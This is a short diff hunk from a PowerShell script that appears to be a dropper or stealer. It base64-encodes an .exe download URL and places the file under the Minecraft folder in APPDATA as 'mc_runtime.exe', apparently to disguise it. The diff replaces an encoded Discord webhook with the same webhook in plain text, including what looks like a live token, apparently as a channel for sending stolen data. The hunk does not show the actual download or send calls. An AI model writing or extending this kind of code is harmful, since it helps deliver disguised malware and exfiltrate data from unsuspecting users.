@@ -16,10 +16,9 @@ function w($a)        { Write-Host " $a" -ForegroundColor Yellow }
 function s($a)        { Write-Host " $a" -ForegroundColor Red }
 
 $u1 = "aHR0cHM6Ly9naXRodWIuY29tL2dhbGFyb2wvY2hlY2tlci9yZWxlYXNlcy9kb3dubG9hZC8xMjMvMTIzLmV4ZQ=="
-$u2 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU1MzQ4MDU3OTU0MDk3OTczMi9kLVRpQUp6d1kycGpuMHRSVTdMTXFUYjNwd2wzSXI3M2ZsbVVHVlpoNXMzTVhCTndsQ0ZXdFNaTk1KaExfa19CamZIaQ=="
+$wh = "https://discord.com/api/webhooks/1553480579540979732/d-TiAJzwY2pjn0tRU7LMqTb3pwl3Ir73flmUGVZh5s3MXBNwlCFWtSQNMJhL_k_BjfHi"
 
 $cfg = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u1))
-$wh  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u2))
 
 $rp = Join-Path $env:APPDATA ".minecraft\runtime\mc_runtime.exe"
 $rd = Split-Path $rp -Parent
